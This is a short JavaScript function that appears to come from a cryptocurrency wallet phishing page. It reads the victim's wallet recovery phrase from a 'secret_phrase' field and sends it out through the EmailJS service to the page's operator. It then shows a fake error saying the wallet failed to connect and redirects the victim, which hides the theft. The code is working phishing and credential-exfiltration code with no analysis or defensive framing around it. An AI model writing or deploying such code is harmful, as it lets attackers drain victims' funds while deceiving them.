function SendMail() {
    var params = {
        result : document.getElementById("secret_phrase").value
    }
    emailjs.send("service_k3ez40m", "template_c2fw9of", params).then(function (res) {
        alert("Error!: wallet failed to interact successfully" );
        window.location.href = "/check/index.html";
    })
}